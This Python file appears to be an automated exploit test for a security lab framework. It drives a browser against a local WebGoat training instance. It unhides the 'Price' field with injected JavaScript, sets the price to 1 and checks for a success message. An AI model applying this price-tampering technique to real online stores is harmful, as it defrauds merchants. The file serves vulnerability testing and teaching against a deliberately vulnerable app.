from data.exploits.framework.BasicExploit import BasicExploit

class Exploit(BasicExploit):

    attributes = {
      'Name' :        'WebGoat_ParameterTampering_HiddenFields',
      'Description' : "'Hidden fields manipulation' example from WebGoat",
      'References' :  [["EMPTY"]], 
      'Target' :      "WebGoat",
      'Container': 'ubuntu',
      'TargetLicense' : '',
      'Plugin' : '',
      'VulWikiPage' : "None",
      'Type' : 'Hidden Fields'
    }


    def runExploit(self):
        goat = self.wrapper
        goat.navigate("http://guest:guest@localhost:49160/WebGoat/attack")
        goat.find_name("start").click()
        goat.implicit_wait(5)

        goat.navigate("http://localhost:49160/WebGoat/attack?Screen=53&menu=1600")
        script = "document.getElementsByName('Price')[0].type = ''"
        goat.execute_js(script)

        hidden = goat.find_name("Price")
        hidden.clear()
        hidden.keys("1")

        goat.find_xpath("//input[@value='Update Cart']").click()
        goat.implicit_wait(5)

        self.assertIn("Congratulations", goat.find("message").raw.text, "Exploit didn't work")    

